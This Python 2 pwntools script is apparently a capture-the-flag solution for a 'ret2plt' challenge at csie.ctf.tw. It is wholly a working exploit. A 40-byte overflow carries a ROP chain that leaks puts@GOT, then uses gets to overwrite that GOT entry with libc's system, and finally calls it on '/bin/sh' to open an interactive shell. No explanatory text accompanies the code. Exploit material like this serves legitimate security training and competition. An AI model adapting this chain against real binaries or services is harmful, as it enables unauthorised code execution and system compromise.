import pwn
import pwnlib
import time

pwn.context.arch = 'amd64'

def build_ropchain():
    c = ''

    # leak puts@GOT
    c += pwn.pack(0x00000000004006f3) # pop rdi
    c += pwn.pack(0x0000000000601018) # puts@GOT
    c += pwn.pack(0x00000000004004e0) # puts@plt

    # gets(puts@GOT)
    c += pwn.pack(0x00000000004006f3) # pop rdi
    c += pwn.pack(0x0000000000601018) # puts@GOT
    c += pwn.pack(0x0000000000400510) # gets@plt

    # rdi = address of /bin/sh
    c += pwn.pack(0x00000000004006f3) # pop rdi
    c += pwn.pack(0x0000000000601018 + 8) # @ puts@GOT + 8
    c += pwn.pack(0x00000000004004e0) # puts@plt

    return c

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10131)
    else:
        p = pwn.process('./ret2plt-012ef76e3de41b4d6859a9379107ffab89b21ae3')

    libc_elf = pwn.ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

    payload = 'a' * (32+8) + build_ropchain()

    p.sendline(payload)
    print p.recvuntil('\n')

    put_got = p.recvuntil('\n')
    put_got = pwn.u64(put_got[:-1].ljust(8, '\x00'))
    print hex(put_got)

    pwn.gdb.attach(p)

    libc_base = put_got - libc_elf.symbols['puts']
    system_got = libc_base + libc_elf.symbols['system']

    print hex(libc_base)
    print hex(system_got)

    p.sendline(pwn.p64(system_got) + '/bin/sh\x00')

    p.interactive()
